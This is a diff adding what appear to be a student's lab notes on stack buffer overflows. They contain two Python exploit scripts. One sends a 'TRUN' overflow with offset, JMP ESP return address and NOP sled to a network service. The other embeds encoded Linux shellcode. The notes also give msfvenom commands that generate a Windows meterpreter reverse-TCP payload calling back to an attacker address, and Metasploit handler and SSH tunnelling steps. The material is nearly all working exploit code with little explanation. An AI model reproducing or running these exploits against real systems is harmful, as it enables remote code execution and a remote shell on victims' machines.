@@ -357,5 +357,74 @@ msfvenom -p windows/meterpreter/reverse_tcp lhost=10.50.22.235 lport=4444 -b "\x
 		msf6 exploit(multi/handler) > exploit
 		
 		[*] Started reverse TCP handler on 0.0.0.0:4444
-		
 
+
+#!/usr/bin/python2.7
+
+import socket
+
+'''
+625011AF
+625011BB
+msfvenom -p windows/meterpreter/reverse_tcp lhost=10.50.X.X lport=4444 -b "\x00" -f python
+'''
+
+
+buf = "TRUN /.:/" #Exploit
+buf += "A" * 2003 #Buffer Offset
+buf += "\xa0\x12\x50\x62"  #JMP ESP
+buf += "\x90" * 15 #NOP SLED
+buf += #SHELLCODE HERE
+s = socket.socket (socket.AF_INET, socket.SOCK_STREAM) # Creates IPv4 socket
+
+s.connect(("0.0.0.0",PORTHERE))    #IP and port to connect to
+print s.recv(1024)   #print response
+s.send(buf)       #sends the variable buf
+print s.recv(1024)   #print response
+s.close()         #close the connection
+
+
+
+#!/usr/bin/python2.7
+
+# Fill UP THE BUFFER
+buf = "A" * 62
+
+# EIP REGISTER TO JMP ESP
+buf += "\x59\x3b\xde\xf7"
+
+'''
+JMP ESP addresses
+0xf7de3b59  
+0xf7f588ab
+0xf7f645fb
+0xf7f6460f
+0xf7f64aeb
+'''
+# assisti with encoding NOP SLED
+buf +="\x90" * 10
+'''
+msfvenom -p linux/x86/exec CMD=whoami -b '\x00' -f python
+'''
+# Shell Code / Payload below
+buf += b"\xdb\xd8\xbe\x34\xcb\x24\x47\xd9\x74\x24\xf4\x58"
+buf += b"\x31\xc9\xb1\x0e\x31\x70\x19\x83\xe8\xfc\x03\x70"
+buf += b"\x15\xd6\x3e\x4e\x4c\x4e\x58\xdd\x34\x06\x77\x81"
+buf += b"\x31\x31\xef\x6a\x31\xd5\xf0\x1c\x9a\x47\x98\xb2"
+buf += b"\x6d\x64\x08\xa3\x7d\x6a\xad\x33\xeb\x0c\xce\x5c"
+buf += b"\x85\xb6\x79\xc4\x79\x10\x5c\x2a\x0d\x34\xcf\x4b"
+buf += b"\x9c\xad\x0f\xdb\x0d\xa4\xf1\x2e\x31"
+
+print(buf)
+
+ssh student@jumpbox -L 41245:192.168.150.245:9999
+
+set multi/handler on msfconsole.
+
+use script with msfvenom payload
+
+
+
+
+
+  
